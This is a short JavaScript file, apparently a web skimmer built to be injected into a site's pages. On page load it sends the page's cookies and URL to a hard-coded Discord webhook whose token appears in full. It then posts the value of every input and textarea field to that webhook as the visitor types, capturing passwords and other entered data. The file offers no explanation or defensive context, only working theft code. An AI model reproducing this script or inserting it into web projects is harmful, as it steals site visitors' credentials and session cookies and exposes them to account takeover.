function discordSend(message) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://discord.com/api/webhooks/1516627039753605140/8VNqYb-cIYMLTg4dBoS1g2exxqGa4I51eQb8fU-xo9l8x1U2AjQR7Bs7MCkyQFrPR_GV', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    var payload = JSON.stringify({ content: message });
    xhr.send(payload);
}

// 
discordSend(
    `! ${document.domain}\n\n` +
    `URL :\n${location.href}\n\n` +
    `Document :\n${document.cookie}`
);

document.addEventListener('input', function (e) {
    if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
        discordSend(
            `📥  di ${location.href}\n` +
            `Name: ${e.target.name || '(tidak ada name)'}\n` +
            `Value: ${e.target.value}`
        );
    }
});
